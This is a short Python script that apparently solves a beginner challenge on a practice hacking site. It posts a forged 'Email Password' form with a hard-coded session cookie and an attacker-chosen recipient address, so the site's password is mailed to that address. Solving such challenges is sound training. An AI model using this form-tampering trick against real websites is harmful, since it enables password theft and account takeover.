import requests

url = "https://thisislegal.com/challenge/basic/5"
cookies = {"PHPSESSID": "a59vbkfch5ckqk2o5olp9q4aaf"}
data = {"to": "yitimulizu@2mailnext.top", "emailSubmit":"Email+Password"}
r = requests.post(url, cookies=cookies, data=data)
print r.text